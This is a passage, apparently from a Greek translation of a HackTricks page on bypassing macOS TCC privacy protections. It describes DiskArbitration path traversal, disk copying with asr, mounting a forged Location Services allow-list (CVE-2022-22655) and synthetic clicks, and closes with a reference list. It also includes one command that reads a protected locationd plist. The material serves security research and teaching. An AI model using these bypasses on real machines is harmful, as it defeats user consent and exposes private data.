Η συνάρτηση `DADiskMountWithArgumentsCommon` από το δημόσιο framework `DiskArbitration` εκτελούσε τους ελέγχους ασφαλείας. Ωστόσο, ήταν δυνατή η παράκαμψή της μέσω απευθείας κλήσης του `diskarbitrationd` και, επομένως, η χρήση στοιχείων `../` στη διαδρομή και symlinks.

Αυτό επέτρεπε σε έναν attacker να εκτελεί arbitrary mounts σε οποιαδήποτε τοποθεσία, ακόμη και πάνω από τη βάση δεδομένων TCC, λόγω του entitlement `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και το mount του σε άλλη τοποθεσία, παρακάμπτοντας τις προστασίες TCC.

### CVE-2022-22655 - Location Services

Τα Location Services **δεν** αποθηκεύονται σε βάση δεδομένων TCC όπως οι άλλες υπηρεσίες. Η διαχείρισή τους γίνεται από το `locationd`, το οποίο διατηρεί τη δική του allow-list στο **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Κάθε καταχώριση προσδιορίζεται από τον client (bundle ID ή executable path) και περιλαμβάνει πεδία όπως `Authorized`, `BundleId`, `Executable` και `Registered`.<sup>[[4]](#references)</sup>

Το αρχείο `clients.plist` προστατεύεται από το Sandbox/TCC και δεν μπορεί να τροποποιηθεί ακόμη και ως root — όμως ο κατάλογος **`/var/db/locationd/` δεν προστατευόταν από mounting**. Έτσι, ένας attacker που εκτελούσε κώδικα ως root μπορούσε να δημιουργήσει ένα disk image που περιείχε το δικό του `clients.plist` (με το binary του σημειωμένο ως `Authorized`), να το κάνει mount πάνω από τον κατάλογο και να κάνει restart το `locationd`, ώστε να ενεργοποιηθεί η πλαστογραφημένη allow-list.<sup>[[3]](#references)</sup>

> [!TIP]
> Αυτό ακολουθεί το ίδιο μοτίβο με τα `hdiutil`/`mount` TCC bypasses παραπάνω: το *file* προστατεύεται, ενώ ο *directory* στον οποίο βρίσκεται όχι, επομένως αντικαθιστάτε ολόκληρο τον κατάλογο αντί για το αρχείο.

## Μέσω startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Μέσω grep

Σε αρκετές περιπτώσεις, τα αρχεία αποθηκεύουν ευαίσθητες πληροφορίες, όπως emails, αριθμούς τηλεφώνου, μηνύματα... σε μη προστατευμένες τοποθεσίες (κάτι που θεωρείται vulnerability στο Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Αυτό δεν λειτουργεί πλέον, αλλά [**λειτουργούσε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ένας ακόμη τρόπος με χρήση [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Παράκαμψη του macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Παράκαμψη των macOS TCC User Privacy Protections κατά λάθος και εκ σχεδιασμού](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Παράκαμψη του TCC Location Services (αρχική αναφορά)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Πού στον κόσμο βρίσκεται η Carmen Sandiego: Κατάχρηση του Location Services στο macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: Το TCC bypass κλέβει δεδομένα από το iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (μεταβλητές περιβάλλοντος SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: το hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass που ανακαλύφθηκε στο XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Ό,τι συμβαίνει στο Mac σας, παραμένει στο Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Νέα macOS vulnerability, η "powerdir," θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση σε δεδομένα χρηστών](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Αλλαγή home directory και παράκαμψη του TCC, γνωστό και ως CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Αναπαραγωγή της μουσικής και παράκαμψη του TCC, γνωστό και ως CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Πώς να ληστέψετε μια (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Παράκαμψη του TCC με το Telegram στο macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Αποκάλυψη Apple Vulnerabilities: Έλεγχος των diskarbitrationd και storagekitd, Μέρος 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Ορισμός μεταβλητών περιβάλλοντος στο OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass και privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass με mounting πάνω από τη βάση δεδομένων TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Πάνω από 20 τρόποι για να παρακάμψετε τους μηχανισμούς privacy του macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Knockout Win Against TCC - Πάνω από 20 ΝΕΟΙ τρόποι για να παρακάμψετε τους μηχανισμούς privacy του MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
